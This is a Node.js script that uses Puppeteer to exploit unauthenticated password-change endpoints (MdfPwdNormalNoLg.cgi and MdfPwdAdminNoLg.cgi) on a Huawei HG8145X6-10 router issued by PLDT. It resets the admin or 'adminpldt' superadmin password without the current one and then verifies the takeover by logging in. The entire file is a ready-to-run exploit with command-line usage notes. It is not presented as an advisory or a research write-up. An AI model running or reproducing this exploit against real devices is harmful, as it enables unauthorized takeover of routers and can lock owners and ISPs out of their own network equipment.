#!/usr/bin/env node
/**
 * CGI Password Reset — Huawei HG8145X6-10 (PLDT)
 * -------------------------------------------------
 * Exploits MdfPwdNormalNoLg.cgi / MdfPwdAdminNoLg.cgi to change
 * the router password WITHOUT knowing the current one.
 *
 * Usage:
 *   node cgi_password_reset.cjs                      # Change admin (headless)
 *   node cgi_password_reset.cjs --visible             # Open browser so you can watch
 *   node cgi_password_reset.cjs --keep-open           # Keep browser open after done
 *   node cgi_password_reset.cjs --superadmin          # Change adminpldt
 *   node cgi_password_reset.cjs --password MyPass123!
 *   node cgi_password_reset.cjs --router 192.168.1.1
 *
 * Requirements:
 *   - npm install puppeteer  (already in local-agent/)
 *   - Must be run from the local-agent/ directory
 */

const PUPPETEER = require('puppeteer');

const args = {};
for (let i = 2; i < process.argv.length; i++) {
  const a = process.argv[i];
  if (a.startsWith('--router=')) args.router = a.split('=')[1];
  else if (a.startsWith('--password=')) args.password = a.split('=')[1];
  else if (a === '--router') args.router = process.argv[++i];
  else if (a === '--password') args.password = process.argv[++i];
  else if (a === '--superadmin') args.superadmin = true;
  else if (a === '--visible') args.visible = true;
  else if (a === '--keep-open') args.keepOpen = true;
}

const ROUTER = args.router || '192.168.1.1';
const NEW_PW = args.password || 'Admin12345678';
const SUPERADMIN = args.superadmin || false;
const VISIBLE = args.visible || false;
const KEEP_OPEN = args.keepOpen || false;
const TARGET = SUPERADMIN ? 'adminpldt' : 'admin';
const CGI = SUPERADMIN ? 'MdfPwdAdminNoLg.cgi' : 'MdfPwdNormalNoLg.cgi';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function main() {
  console.log('='.repeat(50));
  console.log('  Huawei HG8145X6-10 CGI Password Reset');
  console.log('='.repeat(50));
  console.log(`  Router:     ${ROUTER}`);
  console.log(`  Target:     ${TARGET}`);
  console.log(`  New pass:   ${NEW_PW}`);
  console.log('='.repeat(50) + '\n');

  console.log(`  Headless:   ${VISIBLE ? 'NO (you can watch!)' : 'yes'}`);
  console.log(`  Keep open:  ${KEEP_OPEN ? 'yes' : 'no'}`);

  const browser = await PUPPETEER.launch({
    headless: !VISIBLE, ignoreHTTPSErrors: true,
    args: ['--no-sandbox', '--ignore-certificate-errors'],
  });
  const page = await browser.newPage();
  page.setDefaultTimeout(30000);

  // 1. Load admin page to initialise JS (getAuthToken, webSubmitForm, etc.)
  console.log('[1] Loading admin page to get CSRF token...');
  await page.goto(`https://${ROUTER}/admin.html`, { waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true });
  await sleep(2000);

  const token = await page.evaluate(() => getAuthToken());
  console.log(`    CSRF token: ${token}`);

  // 2. Submit password change via the router's own webSubmitForm class
  console.log(`[2] Submitting to ${CGI} with new password...`);
  await page.evaluate(([cgi, pw, tk]) => {
    const Form = new webSubmitForm();
    Form.addParameter('z.Password', pw);
    Form.addParameter('x.X_HW_Token', tk);
    const userIdx = 'InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.' + (cgi.includes('Admin') ? '2' : '1');
    Form.setAction('/' + cgi + '?z=' + userIdx + '&RequestFile=login.asp');
    Form.submit();
  }, [CGI, NEW_PW, token]);
  await sleep(3000);
  console.log(`    Final URL: ${page.url()}`);

  // 3. Verify login with new password (use admin.html — login.asp has SSL issues)
  console.log(`[3] Verifying '${TARGET}' login...`);
  await page.goto(`https://${ROUTER}/admin.html`, { waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true });
  await sleep(1500);

  await page.type('input#txt_Username', TARGET, { delay: 10 });
  await page.evaluate(() => { const p = document.querySelector('input#txt_Password'); if (p) p.type = 'text'; });
  await page.type('input#txt_Password', NEW_PW, { delay: 10 });
  await page.click('button#button');
  await sleep(3000);

  const u = page.url();
  let failed = u.includes('login.asp') || u === `https://${ROUTER}/`;
  if (failed) {
    await page.goto(`https://${ROUTER}/admin.html`, { waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true });
    await sleep(500);
    const hasLoginForm = await page.evaluate(() => !!document.querySelector('input#txt_Username'));
    failed = hasLoginForm;
  }
  console.log(`    Post-login URL: ${u}`);
  console.log(`\n  ==> ${failed ? '❌ FAILED - password not changed' : '✅ SUCCESS! ' + TARGET + ' / ' + NEW_PW}`);

  // JSON result line — __RESULT__ prefix so the frontend can reliably find it
  console.log('__RESULT__:' + JSON.stringify({ success: !failed, target: TARGET, password: NEW_PW, url: u }));

  if (KEEP_OPEN) {
    console.log('\n  Browser kept open. Close it manually when done.');
  } else {
    await browser.close();
  }
  if (failed) process.exit(1);
}

main().catch(err => { console.error('[-] Error:', err.message); process.exit(1); });
